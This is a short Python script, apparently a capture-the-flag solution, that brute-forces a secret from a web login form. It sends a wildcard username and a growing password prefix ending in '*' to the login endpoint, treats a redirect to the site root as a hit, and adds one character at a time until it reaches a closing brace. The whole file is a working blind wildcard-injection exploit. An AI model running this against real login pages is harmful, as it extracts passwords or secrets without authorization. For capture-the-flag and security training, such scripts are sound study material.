import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
URL=input("Enter URL :)\n>> ")
if URL[-1] != "/" :
    URL=URL+"/"
flag=""

while True:
    for i in alphabet :
        data={'username':'*','password':f'{flag+i}*'}
        req = requests.post(URL+"login",data=data)
        if req.url == URL :
            flag += i
            break
    if flag[-1] == "}" :
        print(f"get {flag=}")
        break
